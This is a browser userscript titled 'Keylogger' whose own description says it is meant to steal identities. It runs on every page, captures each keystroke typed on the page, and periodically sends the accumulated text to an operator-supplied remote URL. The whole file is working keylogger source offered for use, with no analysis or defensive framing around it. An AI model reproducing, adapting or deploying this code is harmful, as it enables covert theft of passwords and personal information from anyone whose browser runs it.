// ==UserScript==
// @name       Keylogger
// @namespace  *
// @version    0.1
// @description  Just a script to steal your identity
// @match      *
// @copyright  2014+, David Kanda
// @include *
// @require        http://code.jquery.com/jquery-1.11.0.min.js
// ==/UserScript==
/*
 * This work is licensed under a Creative Commons
 * Attribution-NonCommercial-NoDerivs 3.0 Unported License
 * http://creativecommons.org/licenses/by-nc-nd/3.0/
 *
 * UNLESS OTHERWISE MUTUALLY AGREED BY THE PARTIES IN WRITING,
 * LICENSOR OFFERS THE WORK AS-IS AND MAKES NO REPRESENTATIONS
 * OR WARRANTIES OF ANY KIND CONCERNING THE WORK, EXPRESS, IMPLIED,
 * STATUTORY OR OTHERWISE, INCLUDING, WITHOUT LIMITATION, WARRANTIES
 * OF TITLE, MERCHANTIBILITY, FITNESS FOR A PARTICULAR PURPOSE,
 * NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS,
 * ACCURACY, OR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT
 * DISCOVERABLE. SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF
 * IMPLIED WARRANTIES, SO SUCH EXCLUSION MAY NOT APPLY TO YOU.
 * EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT
 * WILL LICENSOR BE LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL,
 * INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING
 * OUT OF THIS LICENSE OR THE USE OF THE WORK, EVEN IF LICENSOR HAS
 * BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
 */

var changeFrame=0;
var record="";
var charCount=0;
var typewatch = (function(){
              var timer = 0;
              return function(callback, ms){
                clearTimeout (timer);
                timer = setTimeout(callback, ms);
              }  
            })();  
$('body').keydown(function(e){
    record=record+String.fromCharCode(e.which);
    typewatch(function () {
        $.ajax({
        
            url: 'http://<your url to accept string here>?s='+record, //replace this url with yours
            type: 'GET',
            crossDomain: true,
            dataType: 'text',
            success: function(result) { },
            error: function(result) { },
        });
        record = ""//reset
	}, 500);
});


                
              


